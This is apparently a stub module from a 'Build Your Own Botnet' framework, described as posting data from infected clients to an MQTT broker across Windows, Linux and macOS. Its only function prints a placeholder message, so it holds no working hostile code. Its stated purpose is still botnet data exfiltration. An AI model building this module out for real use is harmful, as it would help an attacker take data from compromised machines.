#!/usr/bin/python
# -*- coding: utf-8 -*-
'MQTT client (Build Your Own Botnet)'
# standard library
import sys
import time
import json
import threading

# packages
import paho.mqtt.client as mqtt
import paho.mqtt.publish as publish

# utilities
import util

# globals
packages = ['paho-mqtt']
platforms = ['win32','linux2','darwin']
results = {}
usage = 'mqtt <host>:<port>:<topic>'
description = """
Post data from client to MQTT broker.
"""

# main
def _run():
    print("I'm running inside the mqtt module!!!!")


def run():
    """
    Run the MQTT Module

    """
    t = threading.Thread(target=_run, name=time.time())
    t.setDaemon(True)
    t.run()
    return t